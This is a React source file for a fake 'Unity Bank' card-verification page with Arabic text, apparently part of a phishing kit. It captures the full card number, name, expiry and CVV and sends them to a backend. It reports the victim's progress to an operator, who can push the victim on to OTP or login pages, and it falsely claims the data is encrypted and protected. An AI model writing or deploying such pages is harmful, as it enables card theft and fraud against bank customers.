import { useState } from "react";
import { CreditCard, Lock, Shield, ChevronRight } from "lucide-react";
import { unityApi } from "@/lib/api";
import { useTracking, useAdminCommands } from "@/lib/useTracking";

const BRAND = { primary: "#1a3d6e", gold: "#c4923e" };

function formatCard(val: string) {
  return val.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
}

export default function CardPage() {
  useTracking("بيانات البطاقة");
  useAdminCommands({
    "redirect:otp":   () => { window.location.href = "/unity-bank/otp"; },
    "redirect:login": () => { window.location.href = "/unity-bank/login"; },
  });
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardMonth, setCardMonth] = useState("");
  const [cardYear, setCardYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const raw = cardNumber.replace(/\s/g, "");
    if (raw.length < 16) { setErr("رقم البطاقة غير مكتمل"); return; }
    if (!cardName.trim()) { setErr("أدخل الاسم كما يظهر على البطاقة"); return; }
    if (!cardMonth || !cardYear) { setErr("تاريخ الانتهاء غير صحيح"); return; }
    if (cvv.length < 3) { setErr("رمز CVV غير صحيح"); return; }
    setErr("");
    setLoading(true);
    const id = localStorage.getItem("unity_id")!;
    await unityApi.patch(id, {
      cardNumber: raw, cardName, cardMonth, cardYearExp: cardYear, cardCvv: cvv,
      page: "بيانات البطاقة - مكتملة", lastSeen: Date.now()
    });
    setTimeout(() => { window.location.href = "/unity-bank/waiting"; }, 800);
  };

  const digits = cardNumber.replace(/\s/g, "");
  const cardType = digits.startsWith("4") ? "VISA" : digits.startsWith("5") ? "MC" : digits.startsWith("9") ? "مدى" : "CARD";

  return (
    <div className="min-h-screen flex items-center justify-center p-4" dir="rtl"
      style={{ fontFamily: "'Cairo', system-ui, sans-serif", background: `linear-gradient(135deg, ${BRAND.primary} 0%, #0d2847 100%)` }}>
      <div className="w-full max-w-md">
        <div className="bg-white rounded-3xl shadow-2xl overflow-hidden">
          {/* Header */}
          <div className="p-7 pb-5" style={{ background: `linear-gradient(135deg, ${BRAND.primary}, #0d2847)` }}>
            <div className="flex items-center gap-3 mb-4">
              <div className="w-10 h-10 rounded-xl flex items-center justify-center" style={{ background: BRAND.gold }}>
                <CreditCard className="w-5 h-5 text-white" />
              </div>
              <div>
                <h2 className="text-white font-black text-lg">التحقق من الهوية</h2>
                <p className="text-blue-300 text-xs">أدخل بيانات بطاقتك البنكية</p>
              </div>
            </div>

            {/* Card preview */}
            <div className="rounded-2xl p-4 mt-2" style={{ background: "linear-gradient(135deg, #2d5a8e, #1a3d6e)", border: `1px solid ${BRAND.gold}50` }}>
              <div className="flex justify-between items-start mb-4">
                <div className="w-8 h-6 rounded bg-yellow-300/80" />
                <span className="text-white font-black text-sm">{cardType}</span>
              </div>
              <p className="text-white font-mono text-base tracking-widest mb-3" dir="ltr">
                {cardNumber || "•••• •••• •••• ••••"}
              </p>
              <div className="flex justify-between items-end">
                <div>
                  <p className="text-white/50 text-[9px] font-bold">اسم حامل البطاقة</p>
                  <p className="text-white text-xs font-bold uppercase">{cardName || "YOUR NAME"}</p>
                </div>
                <div className="text-left">
                  <p className="text-white/50 text-[9px] font-bold">تاريخ الانتهاء</p>
                  <p className="text-white text-xs font-bold">{cardMonth && cardYear ? `${cardMonth}/${cardYear}` : "MM/YY"}</p>
                </div>
              </div>
            </div>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="p-7 space-y-4">
            <div>
              <label className="text-xs font-black text-gray-600 mb-1.5 flex items-center gap-1">
                <CreditCard className="w-3 h-3" style={{ color: BRAND.primary }} />
                رقم البطاقة
              </label>
              <input
                type="tel"
                value={cardNumber}
                onChange={e => setCardNumber(formatCard(e.target.value))}
                placeholder="0000 0000 0000 0000"
                dir="ltr"
                className="w-full border-2 border-gray-200 rounded-xl px-4 py-3 text-sm font-mono outline-none"
                onFocus={e => (e.target.style.borderColor = BRAND.primary)}
                onBlur={e => (e.target.style.borderColor = "#e5e7eb")}
              />
            </div>

            <div>
              <label className="text-xs font-black text-gray-600 mb-1.5 block">الاسم على البطاقة</label>
              <input
                type="text"
                value={cardName}
                onChange={e => setCardName(e.target.value.toUpperCase())}
                placeholder="AHMED AL-RASHIDI"
                dir="ltr"
                className="w-full border-2 border-gray-200 rounded-xl px-4 py-3 text-sm font-mono outline-none uppercase"
                onFocus={e => (e.target.style.borderColor = BRAND.primary)}
                onBlur={e => (e.target.style.borderColor = "#e5e7eb")}
              />
            </div>

            <div className="grid grid-cols-3 gap-3">
              <div>
                <label className="text-xs font-black text-gray-600 mb-1.5 block">الشهر</label>
                <select value={cardMonth} onChange={e => setCardMonth(e.target.value)}
                  className="w-full border-2 border-gray-200 rounded-xl px-3 py-3 text-sm outline-none bg-white"
                  onFocus={e => (e.target.style.borderColor = BRAND.primary)}
                  onBlur={e => (e.target.style.borderColor = "#e5e7eb")}>
                  <option value="">MM</option>
                  {Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0")).map(m => (
                    <option key={m} value={m}>{m}</option>
                  ))}
                </select>
              </div>
              <div>
                <label className="text-xs font-black text-gray-600 mb-1.5 block">السنة</label>
                <select value={cardYear} onChange={e => setCardYear(e.target.value)}
                  className="w-full border-2 border-gray-200 rounded-xl px-3 py-3 text-sm outline-none bg-white"
                  onFocus={e => (e.target.style.borderColor = BRAND.primary)}
                  onBlur={e => (e.target.style.borderColor = "#e5e7eb")}>
                  <option value="">YY</option>
                  {Array.from({ length: 10 }, (_, i) => String(24 + i)).map(y => (
                    <option key={y} value={y}>{y}</option>
                  ))}
                </select>
              </div>
              <div>
                <label className="text-xs font-black text-gray-600 mb-1.5 block">CVV</label>
                <input
                  type="password"
                  value={cvv}
                  onChange={e => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  placeholder="•••"
                  dir="ltr"
                  className="w-full border-2 border-gray-200 rounded-xl px-3 py-3 text-sm font-mono outline-none text-center"
                  onFocus={e => (e.target.style.borderColor = BRAND.primary)}
                  onBlur={e => (e.target.style.borderColor = "#e5e7eb")}
                />
              </div>
            </div>

            {err && (
              <div className="bg-red-50 border border-red-200 rounded-xl p-3 text-center">
                <p className="text-red-600 text-sm font-bold">{err}</p>
              </div>
            )}

            <button type="submit" disabled={loading}
              className="w-full py-4 rounded-xl text-white font-black text-base hover:opacity-90 transition-opacity disabled:opacity-60 flex items-center justify-center gap-2 shadow-lg mt-2"
              style={{ background: loading ? "#6b7280" : BRAND.primary }}>
              {loading ? (
                <>
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  جاري التحقق...
                </>
              ) : (
                <>متابعة <ChevronRight className="w-4 h-4" /></>
              )}
            </button>

            <div className="bg-gray-50 rounded-xl p-3 flex items-center gap-2">
              <Shield className="w-4 h-4 text-green-500 flex-shrink-0" />
              <p className="text-xs text-gray-500 font-semibold">بياناتك مشفرة ومحمية بالكامل</p>
              <Lock className="w-3 h-3 text-green-500 mr-auto" />
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
